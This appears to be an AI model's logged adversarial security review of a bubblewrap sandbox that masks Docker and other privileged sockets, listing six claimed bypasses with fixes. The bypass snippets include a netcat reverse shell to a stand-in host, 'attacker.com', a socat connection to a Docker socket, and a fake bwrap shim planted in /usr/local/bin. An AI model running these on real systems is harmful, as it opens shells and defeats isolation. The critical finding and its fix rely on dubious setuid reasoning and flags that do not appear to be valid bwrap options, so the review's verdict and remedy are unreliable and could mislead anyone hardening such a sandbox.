# deputy-seal code panel: anthropic/claude-opus-4.1

_finish=stop seconds=114.2 cost=$0.5499 usage={'prompt_tokens': 28822, 'completion_tokens': 1568, 'total_tokens': 30390, 'cost': 0.54993, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 0, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.54993, 'upstream_inference_prompt_cost': 0.43233, 'upstream_inference_completions_cost': 0.1176}, 'completion_tokens_details': {'reasoning_tokens': 0, 'image_tokens': 0, 'audio_tokens': 0}}_

I'll conduct a thorough adversarial review of this maintenance sandbox implementation, hunting for bypasses and verification failures.

## FINDINGS

### 1. CRITICAL: SETUID BINARY BYPASS VIA FULL FILESYSTEM VIEW
**ID:** SETUID_ESCAPE  
**SEVERITY:** CRITICAL  
**LOCATION:** maintain.py:_bwrap_argv (line ~180), missing --nosuid flag  
**CONCRETE BYPASS:** 
```bash
# Inside sandbox, exec a host setuid-root binary
exec /usr/bin/su -c "umount /var/run/docker.sock && nc -e /bin/sh attacker.com 443"
```
**WHY IT BREAKS:** The sandbox binds `/` with `--bind / /` but does NOT add `--nosuid`. While `--cap-drop ALL` removes caps from the initial process, a setuid-root binary like `/usr/bin/su` or `/usr/bin/sudo` can REGAIN root privileges. With real uid 0 inside the userns, these binaries execute their setuid transition and gain CAP_SYS_ADMIN in the mount namespace, allowing umount of the deputy masks.
**CAUGHT BY:** NO - the CapEff/CapPrm check only verifies the INITIAL shell, not what a setuid binary gains after exec
**FIX:** Add `--nosuid` to all bind mounts, especially the root bind

### 2. HIGH: ABSTRACT NAMESPACE SOCKET BYPASS
**ID:** ABSTRACT_SOCKET_REACH  
**SEVERITY:** HIGH  
**LOCATION:** maintain.py module docstring acknowledges pathname sockets only  
**CONCRETE BYPASS:**
```bash
# If Docker/containerd listens on abstract namespace socket
socat - ABSTRACT-CONNECT:/docker.sock
```
**WHY IT BREAKS:** The mask only covers pathname UNIX sockets via `/dev/null` bind. Abstract namespace sockets (prefixed with `@` or `\0`) exist in the network namespace, not the filesystem. With `--unshare-net`, these are isolated, but the module docstring claims to seal "pathname UNIX socket" paths specifically.
**CAUGHT BY:** YES - `--unshare-net` creates a fresh network namespace, cutting abstract socket reach
**FIX:** Document that abstract sockets are covered by netns isolation

### 3. MEDIUM: FUSE-BASED UNMOUNT POSSIBILITY
**ID:** FUSERMOUNT_UNMOUNT  
**SEVERITY:** MEDIUM  
**LOCATION:** maintain.py:_bwrap_argv, no explicit fuse handling  
**CONCRETE BYPASS:**
```bash
# If fusermount3 is setuid (some distros)
fusermount3 -u /var/run/docker.sock
```
**WHY IT BREAKS:** `fusermount`/`fusermount3` might be setuid on some systems and could potentially unmount bind mounts in certain configurations, especially if the user has fuse mounts in the namespace.
**CAUGHT BY:** PARTIAL - would need setuid fusermount AND specific mount configuration
**FIX:** Explicitly check for setuid fusermount in the probe, add `--disable-clone-newuser` to prevent fuse operations

### 4. MEDIUM: TOCTOU ON DEPUTY SOCKET ENUMERATION
**ID:** DEPUTY_TOCTOU  
**SEVERITY:** MEDIUM  
**LOCATION:** maintain.py:wrap_maintenance calls _present_deputy_sockets at wrap time  
**CONCRETE BYPASS:**
```bash
# Race: socket created AFTER enumeration but BEFORE sandbox starts
# Attacker creates /var/run/evil.sock between wrap and exec
```
**WHY IT BREAKS:** Deputies are enumerated at wrap_maintenance time, but the actual sandbox starts microseconds later. A socket created in that window won't be masked.
**CAUGHT BY:** PARTIAL - requires precise timing and ability to create sockets in system directories
**FIX:** Re-enumerate deputies inside the guard script, fail if new ones appeared

### 5. LOW: BWRAP PATH SUBSTITUTION
**ID:** BWRAP_PATH_SHADOW  
**SEVERITY:** LOW  
**LOCATION:** contained.py:_resolve, but maintain.py uses contained._BWRAP_BIN directly  
**CONCRETE BYPASS:**
```bash
# Before maintenance_available probe, create malicious bwrap
echo '#!/bin/sh\nexec "$@"' > /usr/local/bin/bwrap && chmod +x /usr/local/bin/bwrap
```
**WHY IT BREAKS:** If an attacker can write to `/usr/local/bin` (often user-writable in some configs) before the first import, they could place a fake bwrap that doesn't actually sandbox.
**CAUGHT BY:** YES - the guard's capability check would fail (caps not dropped by fake bwrap)
**FIX:** Verify bwrap binary signature/checksum, or use only system paths

### 6. LOW: PIVOT_ROOT ESCAPE ATTEMPT
**ID:** PIVOT_ROOT_ATTEMPT  
**SEVERITY:** LOW  
**LOCATION:** Not explicitly blocked in maintain.py  
**CONCRETE BYPASS:**
```bash
mkdir /tmp/newroot /tmp/oldroot
pivot_root /tmp/newroot /tmp/oldroot
# Would fail due to cap-drop
```
**WHY IT BREAKS:** While pivot_root requires CAP_SYS_ADMIN (blocked by cap-drop), the code doesn't explicitly document this vector.
**CAUGHT BY:** YES - CAP_SYS_ADMIN required for pivot_root, caps are dropped
**FIX:** None needed, already caught

## STEELMAN

The maintenance sandbox demonstrates strong defense-in-depth with its multi-layered verification approach: capability dropping, in-child guard verification, and positive-token whitelisting. The guard's runtime checks of CapEff/CapPrm provide robust verification that the umount-defense precondition actually holds, not just trusting bwrap flags. The fallback behavior is exemplary - honestly reporting when isolation cannot be achieved rather than claiming false security.

## VERDICT

**SERIOUS_FLAWS** - The missing `--nosuid` flag on the root filesystem bind is a critical oversight that allows setuid binaries to regain CAP_SYS_ADMIN and defeat the deputy mask.

**Highest-value fix:** Add `--nosuid` to the `--bind / /` mount (line ~180 in _bwrap_argv):
```python
"--bind", "/", "/", "--nosuid",  # Critical: prevent setuid escalation
```
